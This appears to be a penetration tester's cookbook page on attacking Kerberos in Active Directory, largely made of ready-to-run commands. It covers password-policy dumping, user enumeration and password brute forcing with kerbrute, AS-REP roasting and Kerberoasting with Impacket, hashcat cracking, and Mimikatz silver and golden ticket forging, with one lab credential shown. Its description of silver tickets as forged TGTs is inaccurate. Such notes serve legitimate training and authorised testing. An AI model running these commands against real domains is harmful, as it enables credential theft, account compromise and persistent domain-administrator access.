---
layout: default
title: Kerberos
parent: ENUMERATION
has_children: false
has_toc: false
---

{% include toc.html %}

*Clock skew issues: if nmap returns a large clock skew (more than five minutes), synchronise the system clock with the remote host. For details, see [here](../cookbooks/time-date.md).*

## References

https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ

## Password policy
First, try and get the password policy so as to prevent locking legitimate user accounts. If there is a strict password policy in place, think twice about trying to brute force accounts. It's possible credentials are needed to dump the password policy, so it may be necessary to discover an account set to "Do not require Kerberos pre-authentication".

```csharp
// Test for password policy.
crackmapexec smb 10.10.10.175 --pass-pol
crackmapexec smb 10.10.10.175 -u 'user' -p 'pass' --pass-pol
crackmapexec smb 10.10.10.175 -d egotistical-bank.local -u 'fsmith' -p 'Thestrokes23' --pass-pol
```

## Enumerating users
Check the password policy to ensure you won't lock users out. Generate a list of user names to test with. If you can discover the username format the domain is using that will reduce the number of permutations required. Service account names are of particular interest here. if possible, create a list of potential service account names applicable to your application and try them along with usernames.

```csharp
// Very g.uick.
kerbrute userenum --safe --domain domain.local --dc 10.x.x.x ./list-of-users
```

## "Do not require Kerberos pre-authentication"
If users have "Do not require Kerberos pre-authentication" enabled, it's possible to dump the user's hash and try and recover the password using `Hashcat`.

```csharp
// Impacket
GetNPUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -no-pass -usersfile ./known-users -format hashcat -request
```

## Brute forcing a user's password over the network
Be sensible about this and only use compact wordlists over the network. Sending `rockyou.txt` over the network for multiple users is going to end in issues, particularly if the DC is logging Kerberos authentication attempts.

*If clock skew is an issue, not using the verbose flag will potentially miss valid passwords as Kerberos will return a KDC_Error if he password is valid which Kerbrute will ignore. By including the -v flag, the invalid passwords will show as such, and valid passwords will show with an error. A better solution is to synchronise your system clock with the DC. To fix clock skew issues, see [here](../cookbooks/time-date.md).*

```csharp
// Run this in verbose mode as errors (like clock skew errors) are not displayed otherwise.
kerbrute bruteuser -v --safe --domain egotistical-bank.local --dc 10.x.x.x wordlists/passwords username

// Write results to file.
kerbrute bruteuser -v --safe --domain egotistical-bank.local --dc 10.x.x.x --output username.out wordlists/passwords username
```

## Kerberoasting
Kerberoasting is an attack against Active Directory user accounts that have associated `Service Principle Names` (`SPNs` or `spins`). Services need an `SPN` assocaites with them in order to use Kerberos authentication. User accounts need manageable passwords, where as computer accounts have huge, random passwords that are changed every 30 days, or trying to crack them is a potentially impossible task. To get user accounts, you can use GetUserSPNs.py to query the request and return the account's hash. The hash can then (hopefully) be cracked using Hashcat. To carry out the attack, you need two things:

1. A user account and password (doesn't need to be privileged)
2. A service account with a registered SPN

Return all the accounts with `SPNs` along with the hashed requests:
```csharp
GetUserSPNs.py -dc-ip 10.x.x.x domain.local/user:pass -request
```

Alternatively, an LDAP search:
```pwershell
PS C:\> Import-Module ActiveDirectory
PS C:\> Get-ADUser -LDAPFilter "(ServicePrincipalName=*)"
```

Using Hashcat to crack the hash:
```csharp
hashcat -m 13100 file-containing-hash /usr/share/wordlists/rockyou.txt
```

## Kerberos Silver tickets
Silver tickets are forged Kerberos TGT tickets associated with a particular Kerberos service. For this attack, two items are required:

1. Domain SID. Removing the last part of a user's SID results in the domain SID.
2. NTLM hash of the target machine or NTLM of a service account.

Using Mimikatz to forge the TGT ticket, we can impersonate the local Adminstrator account:
```csharp
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-...-... /user:Administrator /target:domain.name.of.target /service:CIFS /rc4:<NTLM hash of box> /ptt
```

The `ptt` parameter stands for `Pass the Ticket` and associates the ticket with the logon session.

## Kerberos Golden tickets
Not a privilege escalation attack, more a way of maintaining access due to the infrequency with which the krbtgt account password is changed. Golden tickets work with all services, unlike Silver tickets which are associated with a particular service. The attack allows you to create a long-lived ticket associated with an account user, such as Administrator. For this attack, three items are required:

1. Domain SID. Removing the last part of a user's SID results in the domain SID.
2. The NTLM hash (remember, the hash format is L) from the krbtgt account secret.
3. The domain name.

Using Mimikatz to create the Golden ticket:
```csharp
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-...-... /user:Administrator /krbtgt:<krbtgt accounts's NTLM hash> /ptt
```